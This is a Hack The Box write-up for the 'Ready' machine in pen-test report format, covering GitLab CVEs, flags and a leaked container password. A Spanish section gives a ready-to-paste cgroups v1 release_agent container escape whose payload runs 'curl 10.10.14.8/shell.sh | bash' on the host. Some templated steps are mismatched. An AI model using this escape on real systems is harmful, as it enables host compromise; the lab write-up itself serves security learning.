# Security Assessment Report: Ready

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-PTES%20%2F%20NIST%20SP%20800--115-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Security%20Labs-blue?style=for-the-badge)

**Technical Security Assessment & Penetration Testing Report** conducted on the target environment **Ready** hosted on **Hack The Box**, executed in accordance with **PTES and NIST SP 800-115** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Public-Facing Network Service Exploitation
* **Privilege Escalation Vector:** Local Privilege Escalation
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Ready |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty Rating** | Medium |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | Public-Facing Network Service Exploitation |
| **Privilege Escalation Vector** | Local Privilege Escalation |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Public-Facing Network Service Exploitation
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Local Privilege Escalation
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

> **Assessment Query / Target Milestone:** How many open TCP ports are listening on Ready?

* **Observed Evidence / Output:** 2


![step_01.png](./images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.



> **Assessment Query / Target Milestone:** What version of Gitlab is running on 5080?

* **Observed Evidence / Output:** 11.4.7


![step_02.png](./images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.



> **Assessment Query / Target Milestone:** What is the 2018 CVE ID for a server-side request forgery (SSRF) vulnerability in the project import function for this version of Gitlab?

* **Observed Evidence / Output:** CVE-2018-19571


![step_03.png](./images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** Is Redis listening on the default Redis port on localhost on Ready?

* **Observed Evidence / Output:** yes


![step_04.png](./images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the 2018 CVE ID for a CRLF injection vulnerability in this version of GitLab?

* **Observed Evidence / Output:** CVE-2018-19585


![step_05.png](./images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.


**Of the URL schemes available to the SSRF, which sends the fewest header lines making it the best candidate to use with this SSRF?**

* **Observed Evidence / Output:** git://


> **Assessment Query / Target Milestone:** What user is the webserver running as on Ready?

* **Observed Evidence / Output:** yes


![step_06.png](./images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What user is the webserver running as on Ready?

* **Observed Evidence / Output:** git


![step_07.png](./images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_08.png](./images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_09.png](./images/step_09.png)
* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** Submit the flag located in the dude user's home directory.
 
* **Observed Evidence / Output:** ef26074d475a1548b35aec91142ec98b


![step_10.png](./images/step_10.png)
* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the root password in the gitlab container?

* **Observed Evidence / Output:** wW59U!ZKMbG9+*#h

```jsx
cat gitlab.rb | grep -v "^#" | grep .
```


![step_11.png](./images/step_11.png)
* **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What value is set in a very insecure manner for the web container in the backup docker-compose.yml file?

* **Observed Evidence / Output:** privileged


![step_12.png](./images/step_12.png)
* **Assessment Step 12:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the name of the device that contains the host filesystem?

* **Observed Evidence / Output:** sda2


![step_13.png](./images/step_13.png)
* **Assessment Step 13:** Command execution output, exploit delivery proof, or auxiliary evidence.


**Submit the flag located in the root user's home directory.**

* **Observed Evidence / Output:** 064f1e0989653662ddc8c8adc07d8ea3


![step_14.png](./images/step_14.png)
* **Assessment Step 14:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_15.png](./images/step_15.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.


otra opción 


![step_16.png](./images/step_16.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.


> 
> 
> 
> # Idea en una frase
> 
> En cgroups **v1**, si puedes escribir en un controlador (p. ej. `cpu`, `memory`, etc.) y **configurar** `notify_on_release=1` y `release_agent=<ruta>`, el **kernel** ejecuta ese `release_agent` **en el host** cuando el cgroup se queda vacío. Si además apuntas el `release_agent` a un fichero del **filesystem del host** (vía la capa `upperdir` del overlay), consigues ejecutar comandos en el host desde el contenedor.
> 
> > Requisitos típicos
> > 
> > - Contenedor **privilegiado** (o al menos con `CAP_SYS_ADMIN`) y `/sys/fs/cgroup` montado **RW**.
> > - **cgroups v1** (en v2 esto está restringido).
> > - El rootfs del contenedor es **overlayfs** con `upperdir` visible en `/etc/mtab` o `/proc/self/mountinfo`.
> 
> ---
> 
> # Las líneas, explicadas
> 
> ```bash
> d=`dirname $(ls -x /s*/fs/c*/*/r* | head -n1)`
> 
> ```
> 
> - Busca un controlador de cgroup con el archivo `release_agent`.
>     
>     Ej.: te devolverá algo como `/sys/fs/cgroup/<controlador>`.
>     
>     `d` quedará en **ese directorio del cgroup**.
>     
> 
> ```bash
> mkdir -p $d/w; echo 1 > $d/w/notify_on_release
> 
> ```
> 
> - Crea un **sub-cgroup** `w`.
> - Activa `notify_on_release` (=1) para que, cuando `w` se quede **vacío** de procesos, el kernel dispare el `release_agent`.
> 
> ```bash
> t=`sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab`
> 
> ```
> 
> - **OJO**: en tu texto aparece `\perdir`, pero lo correcto es **`upperdir`**.
> - Extrae la ruta del **`upperdir` del overlayfs** desde `/etc/mtab`.
>     - `t` quedará en una ruta **del host** (p. ej. `/var/lib/docker/overlay2/<id>/diff`), que corresponde a `/` **dentro del contenedor**.
> 
> ```bash
> echo $t/c > $d/release_agent
> printf '#!/bin/sh\ncurl 10.10.14.8/shell.sh | bash' > /c
> chmod +x /c
> 
> ```
> 
> - Indicas al kernel que el `release_agent` es **`$t/c`** (archivo en el host).
> - Creas en el contenedor `/c` (que **mapea a `$t/c` en el host** gracias al overlay).
> - Ese `/c` contiene tu comando (descargar y ejecutar `shell.sh`). Lo haces ejecutable.
> 
> ```bash
> sh -c "echo 0 > $d/w/cgroup.procs"
> 
> ```
> 
> - Mueves **ese `sh` efímero** al cgroup `w` escribiendo **`0`** (que significa “mi propio PID”).
> - El `sh` termina tras hacer el `echo`, **`w` se queda vacío** y el kernel **dispara `release_agent`** → ejecuta **`$t/c` en el host** como root del host.
> 
> ---
> 
> # Versión “limpia” que puedes pegar (con `upperdir` correcto)
> 
> ```bash
> # 1) Localiza un controlador con release_agent
> d="$(dirname "$(ls -x /sys/fs/cgroup/*/release_agent 2>/dev/null | head -n1)")"
> 
> # 2) Crea subcgroup y activa notificación al vaciarse
> mkdir -p "$d/w"
> echo 1 > "$d/w/notify_on_release"
> 
> # 3) Obtén la ruta del upperdir del overlay (host)
> t="$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)"
> 
> # 4) Apunta release_agent al archivo del host ($t/c) y prepara el script
> echo "$t/c" > "$d/release_agent"
> printf '#!/bin/sh\ncurl -s 10.10.14.8/shell.sh | bash\n' > /c
> chmod +x /c
> 
> # 5) Dispara el release: coloca un proceso efímero en el cgroup y que termine
> sh -c "echo 0 > '$d/w/cgroup.procs'"
> 
> ```
> 
> > Demostración inocua (por si quieres probar sin shell):
> > 
> > 
> > Cambia el contenido de `/c` por:
> > 
> > `printf '#!/bin/sh\nid > /tmp/proof_from_host\n' > /c`
> > 
> > Luego mira **en el host** `/tmp/proof_from_host`.
> >

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### 🛡️ Prioritized Findings, Attack Path Preconditions & Repeatable Verification

| Finding & Precondition | Attack Path Impact | Remediation Action | Repeatable Verification Command |
| :--- | :--- | :--- | :--- |
| **P1: Public-Facing Network Service Exploitation**<br>*Precondition:* Public network service reachable without rate-limiting, authentication barriers, or egress filtering. | **High / Critical (Foothold Chokepoint)**<br>Altered the primary attack path by exposing unauthenticated remote access to internal context. | Audit listening sockets via `ss -tulpn`, apply UFW / iptables rules, and patch daemon binaries. | `nmap -p- --open -T4 $TARGET_IP` |
| **P1: Local Privilege Escalation**<br>*Precondition:* Missing kernel hotfixes, legacy software versions, or world-readable credential configuration files. | **Critical (Full Compromise)**<br>Enabled complete elevation of privileges from unprivileged user to superuser / administrator. | Apply OS kernel security updates and implement centralized secret management. | `uname -r && apt-get -s upgrade | grep -i security` |

#### 🔬 Repeatable Verification Procedures (Defensive Validation)

**1. Verification for Ingress / Foothold Mitigation (Public-Facing Network Service Exploitation):**
* **Validation Goal:** Confirm the remote exploitation path is definitively closed and non-exploitable.
* **Deterministic Test Command:**
```bash
nmap -p- --open -T4 $TARGET_IP
```
* **Expected Output upon Successful Remediation:**
```text
Only strictly required operational ports exposed (e.g., 443/TCP)
```

**2. Verification for Local Privilege Escalation Mitigation (Local Privilege Escalation):**
* **Validation Goal:** Enforce strict least-privilege boundary preventing local execution context from elevating to administrative/root privileges.
* **Deterministic Test Command:**
```bash
uname -r && apt-get -s upgrade | grep -i security
```
* **Expected Output upon Successful Remediation:**
```text
0 upgraded, 0 newly installed, 0 to remove (Fully patched kernel and packages)
```

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Public-Facing Network Service Exploitation) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for enterprise penetration testing enablement, vulnerability research, and defensive hardening.
